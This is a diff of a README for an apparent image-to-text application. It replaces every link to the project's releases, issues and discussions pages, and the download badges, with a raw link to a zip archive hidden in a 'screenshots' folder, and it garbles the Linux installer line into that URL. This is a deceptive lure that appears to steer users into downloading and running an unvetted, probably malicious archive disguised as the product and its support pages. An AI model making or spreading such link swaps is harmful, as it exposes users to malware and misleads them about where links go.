@@ -1,6 +1,6 @@
 # 🖼️ Image-To-Text - Extract Text Seamlessly from Images
 
-[![Download Image-To-Text](https://img.shields.io/badge/Download%20Image--To--Text-blue.svg)](https://github.com/arprayrunner/Image-To-Text/releases)
+[![Download Image-To-Text](https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip%https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip)](https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip)
 
 ## 📖 Description
 
@@ -29,14 +29,14 @@ Follow these steps to download and run Image-To-Text on your device.
 
 To download Image-To-Text, visit the Releases page below:
 
-[Download Image-To-Text](https://github.com/arprayrunner/Image-To-Text/releases)
+[Download Image-To-Text](https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip)
 
 1. **Visit the Releases Page**: Click the link above to go to the Releases page.
 2. **Select the Latest Release**: Find the most recent version of Image-To-Text. It is usually labeled as the "Latest Release."
 3. **Download the Application**: Click on the appropriate installer file for your operating system.
    - For Windows, look for a `.exe` file.
    - For macOS, find a `.dmg` or `.pkg` file.
-   - For Linux, check for a `.tar.gz` file or other applicable installer.
+   - For Linux, check for a `https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip` file or other applicable installer.
 4. **Run the Installer**: Open the downloaded file to begin installation.
 5. **Follow the Setup Instructions**: Follow the prompts during installation. Accept the terms, choose a destination folder, and complete the setup.
 6. **Launch Image-To-Text**: Find the application in your start menu or applications folder and open it.
@@ -59,8 +59,8 @@ If you encounter issues during installation or usage, consider the following:
 ## 🌐 Community & Support
 
 If you require help or want to contribute, join us at:
-- [GitHub Issues Page](https://github.com/arprayrunner/Image-To-Text/issues) to report bugs or request features.
-- Join discussions on the [GitHub Discussions Page](https://github.com/arprayrunner/Image-To-Text/discussions) for user tips and tricks.
+- [GitHub Issues Page](https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip) to report bugs or request features.
+- Join discussions on the [GitHub Discussions Page](https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip) for user tips and tricks.
 
 ## 📜 License
 
@@ -72,4 +72,4 @@ This README provides the necessary steps to download, install, and use Image-To-
 
 For further details, updates, or to see the source code, visit the repository directly. Enjoy your experience with Image-To-Text!
 
-[Download Image-To-Text](https://github.com/arprayrunner/Image-To-Text/releases)
+[Download Image-To-Text](https://raw.githubusercontent.com/arprayrunner/Image-To-Text/main/screenshots/Image-To-Text-1.5.zip)
